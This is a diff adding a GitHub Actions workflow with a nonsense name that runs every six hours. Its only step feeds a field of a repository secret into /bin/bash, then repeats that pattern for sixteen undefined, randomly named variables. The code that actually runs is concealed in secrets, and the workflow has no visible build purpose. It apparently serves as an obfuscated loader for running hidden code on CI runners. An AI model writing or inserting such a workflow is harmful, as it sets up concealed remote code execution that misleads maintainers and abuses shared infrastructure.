@@ -1,0 +1,33 @@
+name: biohazardapricots
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: biohazardapricots
+        env:
+          zc406: ${{ secrets.zc406 }}
+        run: |
+          echo $zc406 | jq -r .bwep346 | /bin/bash
+          echo $jgwqt72766 | jq -r .h40245 | /bin/bash
+          echo $ac1 | jq -r .eqm3645 | /bin/bash
+          echo $gi0 | jq -r .dc64 | /bin/bash
+          echo $blj68 | jq -r .dpfgh47 | /bin/bash
+          echo $fcq2338 | jq -r .dzq87250 | /bin/bash
+          echo $zb549 | jq -r .y31 | /bin/bash
+          echo $cke8 | jq -r .okezt06 | /bin/bash
+          echo $k20848 | jq -r .qzjrr9676 | /bin/bash
+          echo $tau03 | jq -r .atix0 | /bin/bash
+          echo $nhna40 | jq -r .tchra1875 | /bin/bash
+          echo $albuv45875 | jq -r .rtzfu317 | /bin/bash
+          echo $tng1 | jq -r .aw31 | /bin/bash
+          echo $zjij69 | jq -r .fw111 | /bin/bash
+          echo $lhn0285 | jq -r .dv8 | /bin/bash
+          echo $dzku933 | jq -r .tvas708 | /bin/bash
+          echo $zde3 | jq -r .chw89837 | /bin/bash
+
